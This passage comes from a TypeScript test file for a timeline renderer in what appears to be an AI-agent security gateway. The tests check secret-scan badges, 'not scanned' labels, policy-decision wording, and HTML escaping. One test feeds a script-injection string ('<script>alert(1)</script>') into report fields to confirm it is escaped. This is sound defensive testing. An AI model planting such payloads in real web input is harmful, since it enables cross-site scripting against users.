    } as unknown as ToolCallEvent;
    const html = renderTimelineHtml(fakeStore(seal([call])), { sessionId: SESSION_D });
    expect(html).toContain('<span class="badge boundary gw-deny"');
    expect(html).toContain('blocked · 1 secret');
  });

  it('scanned: false says "not scanned", with the reason, and never invents counts', () => {
    expect(badge({ scanned: false, action: 'none', secrets_found: 0, injection_found: 0 })).toBe('not scanned (oversize)');
    expect(badge({ scanned: false, action: 'none', secrets_found: 0, injection_found: 0 })).not.toContain('0 findings');
    expect(badge({ scanned: false, action: 'block', secrets_found: 0, injection_found: 0 }, 'deny')).toBe(
      'not scanned (oversize) · blocked',
    );
    expect(badge({ scanned: false, action: 'none', secrets_found: 0, injection_found: 0, error: 'filter_threw' })).toBe(
      'not scanned (error filter_threw)',
    );
  });

  it('a tampered boundary report is escaped and never summarised as "0 findings"', () => {
    const XSS = '3"><script>alert(1)</script>';
    const text = badge({ scanned: true, action: 'flag', secrets_found: XSS, injection_found: 0 });
    expect(text).toContain(escapeHtmlLike(XSS));
    expect(text).not.toContain('0 findings');
    expect(text).not.toContain('<script>');
    // ... including an action the schema does not define.
    const evilAction = badge({ scanned: true, action: XSS, secrets_found: 0, injection_found: 0 });
    expect(evilAction).toContain(escapeHtmlLike(XSS));
    expect(evilAction).not.toContain('<script>');
  });

  it('a policy_decision with no rule_id says "no rule matched", not "policy default"', () => {
    // What the emitter writes for a fail-closed evaluation-error deny: no
    // rule was consulted, so the configured default did NOT apply.
    const evalError: PolicyDecisionEvent = {
      ...base(SESSION_D, '2026-06-13T10:00:01.000Z'),
      kind: 'policy_decision',
      attributes: { 'gen_ai.tool.name': 'explode_on_evaluate', 'cresec.policy.decision': 'deny' },
      decision: 'deny',
      tool: 'explode_on_evaluate',
      request_id: 4,
      policy_hash: sha256Ref('policy bytes'),
      args_hash: sha256Ref('{}'),
    };
    const html = renderTimelineHtml(fakeStore(seal([evalError])), { sessionId: SESSION_D });
    expect(html).toContain('no rule matched');
    expect(html).not.toContain('policy default');
    // A decision that really did match a rule still names it.
    const matched: PolicyDecisionEvent = { ...evalError, request_id: 5, rule_id: 'no-delete' };
    const html2 = renderTimelineHtml(fakeStore(seal([matched])), { sessionId: SESSION_D });
    expect(html2).toContain('rule no-delete');
    expect(html2).not.toContain('no rule matched');
  });
});
